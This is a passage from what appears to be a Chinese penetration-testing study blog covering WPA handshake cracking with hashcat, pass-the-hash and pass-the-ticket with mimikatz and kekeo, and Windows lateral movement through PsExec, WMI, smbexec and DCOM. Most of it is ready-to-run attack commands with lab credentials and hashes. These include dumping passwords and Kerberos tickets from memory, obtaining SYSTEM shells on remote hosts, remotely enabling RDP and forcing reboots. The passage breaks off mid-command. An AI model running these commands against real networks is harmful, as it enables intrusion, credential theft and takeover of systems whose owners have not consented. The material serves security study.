38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831132010.png"></p><p>4、破解密码</p><p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p><pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831113326.png"></p><h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul><li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p></li><li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p></li><li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p></li><li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p></li><li><p>Hashcat 参数优化：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">--gpu-accel 160可以让GPU发挥最大性能--gpu-loops 1024可以让GPU发挥最大性能--segment-size 512    可以提高大字典破解的速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x21-哈希传递与票据传递"><a href="#0x21-哈希传递与票据传递" class="headerlink" title="0x21 哈希传递与票据传递"></a>0x21 哈希传递与票据传递</h1><h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p><p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在远程主机上以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901120511.png"></p><p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p><h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在其他远程计算机中，以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p><p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p><p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p><h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT）是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p><p>使用以下命令可以清除内存中的票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将票据文件注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901153402.png"></p><p>票据传递除了用 mimikatz 还可以用 kekeo</p><h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p><pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901154851.png"></p><p>在 kekeo 中清除当前内存中的其他票据，不然可能会导致票据传递失败</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901155501.png"></p><p>注意点：</p><p>1、票据文件注入内存的默认有效时间为 10 小时</p><p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p><p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p><h1 id="0x22-PsExec-和-WMI-的使用"><a href="#0x22-PsExec-和-WMI-的使用" class="headerlink" title="0x22 PsExec 和 WMI 的使用"></a>0x22 PsExec 和 WMI 的使用</h1><h2 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h2><h3 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h3><p>PsExec 在之前的文章里提到过一次，参见<a href="https://teamssix.com/210802-181052.html">https://teamssix.com/210802-181052.html</a>，今天来着重学习一下。</p><p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p><p>建立 ipc$ 连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator或者net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902092309.png"></p><p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-u 域\用户名-p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者执行以下命令直接回显命令结果</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用 PsExec 时需要注意以下几点：</p><ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li></ul><h3 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexecset rhost 192.168.7.7set smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p><blockquote><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后建立 IPC$ ，使用 type 读取执行结果</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902112523.png"></p><p>也可以预先建立 ipc$ 连接，再使用 wmic</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902113920.png"></p><p>wmiexec.py 还支持通过哈希传递获得 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902122716.png"></p><p>使用 vmiexec.vbs 执行单条命令</p><pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。</p><p>在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。</p><p>不过目前 vmiexec.vbs 已经被卡巴斯基、赛门铁克等杀软列入查杀名单了。</p><h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</p><p>在 Powershell 中运行以下命令</p><pre class="line-numbers language-none"><code class="language-none"># 导入 Invoke-WmiCommand.ps1 脚本Import-Module .\Invoke-WmiCommand.ps1# 指定目标系统用户名$User &#x3D; &quot;teamssix.com\administrator&quot; # 指定目标系统的密码$Password &#x3D; ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 指定要执行的命令和目标 IP$Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.7.7# 将执行结果输出到屏幕上$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902130614.png"></p><h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p><pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名$User&#x3D;&quot;teamssix.com\administrator&quot;# 指定目标系统密码$Password&#x3D;ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential中$Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 在远程系统中运行 calc.exe 命令Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902131658.png"></p><p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p><h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p><pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostnamewmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX RDTOGGLE WHERE ServerName&#x3D;&#39;dc&#39; call SetAllowTSConnections 1或者wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &#39;cmd.exe &#x2F;c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902135523.png"></p><p>使用 wmic 远程重启目标计算机</p><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x23-SMBExec-与-DCOM-的使用"><a href="#0x23-SMBExec-与-DCOM-的使用" class="headerlink" title="0x23 SMBExec 与 DCOM 的使用"></a>0x23 SMBExec 与 DCOM 的使用</h1><h2 id="1、SMBExec"><a href="#1、SMBExec" class="headerlink" title="1、SMBExec"></a>1、SMBExec</h2><p>利用 SMBExec 可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令，它的工作方式类似于 PsExec</p><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h3><p>C++ 版项目地址：<a href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a></p><p>一看这个项目是 8 年前上传的了，然后试了用 VS2019 没编译成功，而且目前各大杀软也都查杀这个工具了，所以这个就不看了，直接看 impacket 里的同类工具。</p><h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p><pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902153131.png"></p><h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p><p>这里安装以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.gitcd smbexec&#x2F;chmod +x install.shsudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可。</p><p>安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：</p><pre class="line-numbers language-none"><code class="language-none">1. System Enumeration   &#x2F;&#x2F; 获取系统信息2. System Exploitation  &#x2F;&#x2F; 执行系统命令3. Obtain Hashes        &#x2F;&#x2F; 获取系统哈希4. Options              &#x2F;&#x2F; 一些其他操作5. Exit                 &#x2F;&#x2F; 退出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 1 System Enumeration 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create a host list                 &#x2F;&#x2F; 扫描目标 IP 段中存活的主机2. Check systems for Domain Admin     &#x2F;&#x2F; 获取目标系统中的管理员3. Check systems for logged in users  &#x2F;&#x2F; 获取当前登录目标系统的用户4. Check systems for UAC              &#x2F;&#x2F; 获取目标系统 UAC 的状态5. Enumerate Shares                   &#x2F;&#x2F; 获取目标系统中的网络共享目录6. File Finder                        &#x2F;&#x2F; 搜索目标系统中的敏感文件7. Remote login validation            &#x2F;&#x2F; 获取目标系统中远程登录的用户8. Main menu                          &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 2 System Exploitation 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Create an executable and rc script    &#x2F;&#x2F; 生成一个 meterpreter Payload 并在目标系统中运行它2. Disable UAC                           &#x2F;&#x2F; 关闭远程主机的 UAC3. Enable UAC                            &#x2F;&#x2F; 开启远程主机的 UAC4. Execute Powershell                    &#x2F;&#x2F; 执行一个 PowerShell 脚本5. Get Shell                             &#x2F;&#x2F; 使用基于 PsExec 的方式获得目标系统的 Shell6. In Memory Meterpreter via Powershell  &#x2F;&#x2F; 通过 PowerShell 在内存中插入 Meterpreter Payload7. Remote system access                  &#x2F;&#x2F; 远程访问系统8. Main menu                             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 3 Obtain Hashes 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Domain Controller            &#x2F;&#x2F; 获取域控哈希2. Workstation &amp; Server Hashes  &#x2F;&#x2F; 获取本地哈希3. Main menu                    &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择菜单 4 Options 有以下选项：</p><pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态2. Load State            &#x2F;&#x2F; 加载以前保存的状态3. Set Thread Count      &#x2F;&#x2F; 设置线程数4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式6. About                 &#x2F;&#x2F; 关于7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取目标系统 UAC 的状态</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163458.png"></p><p>获取目标系统中的网络共享目录</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163631.png"></p><p>获取本地哈希</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902161205.png"></p><h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p><p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p><p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p><p>它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p><p>攻击者可使用 DCOM 进行横向移动，通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p><p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。</p><p>对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。</p><h3 id="在本地通过-DCOM-执行命令"><a href="#在本地通过-DCOM-执行命令" class="headerlink" title="在本地通过 DCOM 执行命令"></a>在本地通过 DCOM 执行命令</h3><p>1、获取 DCOM 程序列表</p><p>Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令</p><pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 7 和 Windows Server 2008 中可以使用 Get-WmiObject 替代 Get-CimInstance</p><pre class="line-numbers language-none"><code class="language-none">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、使用 DCOM 执行任意命令</p><p>在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本。</p><p>在本地以管理员权限启动一个 PowerShell，并执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView | Get-Member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902171015.png"></p><p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p><h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p><ul><li>具有本地管理员权限的 PowerShell</li><li>需要关闭目标系统的防火墙。</li><li>在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户</li></ul><p>1、调用 MMC20.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;))$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)或者[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175722.png"></p><p>2、调用 ShellWindows 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c 